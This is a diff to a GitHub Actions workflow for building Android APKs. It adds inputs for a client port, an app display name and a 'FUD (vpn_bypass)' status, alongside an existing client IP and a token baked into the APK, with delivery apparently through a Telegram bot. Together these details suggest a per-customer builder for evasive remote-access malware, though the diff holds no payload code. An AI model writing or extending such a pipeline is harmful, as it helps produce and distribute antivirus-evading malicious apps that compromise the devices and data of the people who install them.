@@ -60,6 +60,18 @@ on:
         description: 'Client IP address for APK filename'
         required: false
         default: ''
+      client_port:
+        description: 'Client server port for APK delivery message'
+        required: false
+        default: ''
+      app_name:
+        description: 'App display name for APK delivery message'
+        required: false
+        default: ''
+      fud_status:
+        description: 'FUD (vpn_bypass) status at build time: 1=ON, 0=OFF'
+        required: false
+        default: ''
       client_token:
         description: 'Client token for BuildConfig.CLIENT_TOKEN (baked into APK)'
         required: false
@@ -88,6 +100,9 @@ jobs:
       BOT_TOKEN:        ${{ secrets.TELEGRAM_BOT_TOKEN }}
       TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
       CLIENT_TOKEN:     ${{ github.event.inputs.client_token || 'manual' }}
+      CLIENT_PORT:      ${{ github.event.inputs.client_port || '' }}
+      APP_NAME:         ${{ github.event.inputs.app_name || '' }}
+      FUD_STATUS:       ${{ github.event.inputs.fud_status || '' }}
 
     steps:
 
@@ -920,7 +935,10 @@ jobs:
             --pkg         "${{ steps.nova_pkg.outputs.NOVA_PKG }}" \
             --commit      "${{ github.sha }}" \
             --client-name "${{ github.event.inputs.client_name }}" \
-            --client-ip   "${{ github.event.inputs.client_ip }}"
+            --client-ip   "${{ github.event.inputs.client_ip }}" \
+            --client-port "${{ github.event.inputs.client_port }}" \
+            --app-name    "${{ github.event.inputs.app_name }}" \
+            --fud-status  "${{ github.event.inputs.fud_status }}"
 
       # ── 12. Collect + upload error logs (on failure) ──────────────────────────
       - name: Collect error logs
